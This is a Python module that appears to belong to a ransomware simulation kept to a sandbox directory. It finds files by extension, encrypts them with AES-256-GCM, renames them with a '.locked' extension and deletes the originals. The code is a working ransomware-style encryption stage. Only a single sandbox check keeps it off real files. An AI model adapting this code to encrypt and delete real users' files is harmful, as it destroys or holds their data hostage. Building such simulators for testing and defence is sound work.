"""
modules/file_encryptor.py — AES-256-GCM file encryption.

On-disk format for each encrypted file:
    [12 B nonce][ciphertext][16 B GCM auth-tag]
Renamed with .locked extension (appended, not replaced):
    sample.txt → sample.txt.locked   (decrypt strips .locked → sample.txt)

Design notes
------------
* No magic numbers: all sizes imported from config.
* sha256_file() imported from utils.hashing (shared with cleanup).
* encrypt_all() builds and returns a local list — no self.results accumulation.
  Callers MUST hold the return value; do not re-query this object for results.
* is_within_sandbox() called exactly once per file (early-exit guard at top of
  encrypt_file); the check is not repeated later in the same call.
* DecryptionResult lives in cleanup.py — it is not defined here.
* Logger is instance-level (self._logger), injected via log_file in __init__,
  same pattern as cleanup.py — no module-level logger global.
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import List

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config
from utils.hashing import sha256_file
from utils.logger import get_logger
from utils.validator import is_within_sandbox


def _utc_now() -> str:
    """Return current UTC time as an ISO 8601 string with microseconds."""
    return datetime.now(tz=timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Result type — encryption only
# ---------------------------------------------------------------------------
@dataclass
class EncryptionResult:
    original_path:    str
    encrypted_path:   str
    sha256_before:    str
    sha256_after:     str       # sha256 of the encrypted blob (for audit log)
    success:          bool
    # --- fields added for evaluation ---
    original_size:    int  = 0  # bytes of the plaintext file before encryption
    original_removed: bool = False  # True if the original file was deleted
    encrypted_at:     str  = ""     # ISO UTC timestamp recorded after encryption
    error:            str  = ""


# ---------------------------------------------------------------------------
# Encryptor
# ---------------------------------------------------------------------------
class FileEncryptor:
    """
    Discovers and encrypts all target files inside the sandbox directory.

    Parameters
    ----------
    key:      32-byte AES-256 key (generated once by the orchestrator, held in memory)
    sandbox:  Path to the sandbox directory (must already be validated)
    log_file: optional log file path — supplied by the orchestrator
    """

    def __init__(self, key: bytes, sandbox: Path, log_file: Path | None = None) -> None:
        if len(key) != config.KEY_SIZE:
            raise ValueError(
                f"Key must be {config.KEY_SIZE} bytes, got {len(key)}"
            )
        self._aesgcm  = AESGCM(key)
        self._sandbox = sandbox
        self._logger  = get_logger(__name__, log_file=log_file)

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------
    def discover_files(self) -> List[Path]:
        """Return all files matching TARGET_EXTENSIONS inside the sandbox."""
        return [
            p for p in self._sandbox.rglob("*")
            if p.is_file() and p.suffix.lower() in config.TARGET_EXTENSIONS
        ]

    # ------------------------------------------------------------------
    # Single-file encryption
    # ------------------------------------------------------------------
    def encrypt_file(self, path: Path) -> EncryptionResult:
        """
        Encrypt *path* in-place (replace with .locked file).
        Returns an EncryptionResult regardless of success/failure.
        """
        # Guard: single is_within_sandbox call at the top — not repeated.
        if not is_within_sandbox(path, self._sandbox):
            msg = f"Path '{path}' is outside the sandbox — skipped."
            self._logger.warning(msg)
            return EncryptionResult(
                original_path=str(path),
                encrypted_path="",
                sha256_before="",
                sha256_after="",
                success=False,
                error=msg,
            )

        try:
            original_size = path.stat().st_size
            sha_before    = sha256_file(path)
            plaintext     = path.read_bytes()

            nonce      = os.urandom(config.NONCE_SIZE)
            ciphertext = self._aesgcm.encrypt(nonce, plaintext, None)

            # Append .locked — preserves original extension for clean restore
            enc_path = path.parent / (path.name + config.ENCRYPTED_EXT)
            enc_path.write_bytes(nonce + ciphertext)

            sha_after = sha256_file(enc_path)
            ts        = _utc_now()   # timestamp right after successful write

            # Remove original — PermissionError expected on cloud sandbox mounts
            removed = False
            try:
                path.unlink()
                removed = True
            except PermissionError:
                self._logger.warning(
                    "Could not delete original '%s' (read-only mount). "
                    "On a real filesystem the original would be removed.", path
                )

            self._logger.debug("Encrypted: %s → %s", path.name, enc_path.name)
            return EncryptionResult(
                original_path=str(path),
                encrypted_path=str(enc_path),
                sha256_before=sha_before,
                sha256_after=sha_after,
                success=True,
                original_size=original_size,
                original_removed=removed,
                encrypted_at=ts,
            )

        except Exception as exc:  # noqa: BLE001
            self._logger.error("Failed to encrypt '%s': %s", path, exc)
            return EncryptionResult(
                original_path=str(path),
                encrypted_path="",
                sha256_before="",
                sha256_after="",
                success=False,
                error=str(exc),
            )

    # ------------------------------------------------------------------
    # Batch encryption
    # ------------------------------------------------------------------
    def encrypt_all(self) -> List[EncryptionResult]:
        """
        Discover and encrypt every target file in the sandbox.

        Returns a list of EncryptionResult — one per discovered file.
        No self.results — encrypt_all() returns the list directly.
        Callers must hold the return value; do not re-query this object for results.
        """
        files = self.discover_files()
        if not files:
            self._logger.warning("No target files found — nothing to encrypt.")
            return []

        results: List[EncryptionResult] = [self.encrypt_file(f) for f in files]

        ok = sum(1 for r in results if r.success)
        self._logger.info("Encryption complete: %d/%d files encrypted.", ok, len(files))
        return results
